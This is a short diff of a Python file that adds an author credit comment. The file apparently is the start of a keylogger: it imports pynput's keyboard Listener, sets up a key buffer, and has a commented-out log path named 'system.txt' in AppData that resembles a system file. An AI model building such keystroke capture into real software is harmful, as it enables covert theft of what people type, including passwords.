@@ -1,6 +1,8 @@
 import os
 from pynput.keyboard import Listener
 
+#coded by g0dmax55
+
 keys = []
 count = 0
 #path = os.environ['appdata'] +'\\system.txt'
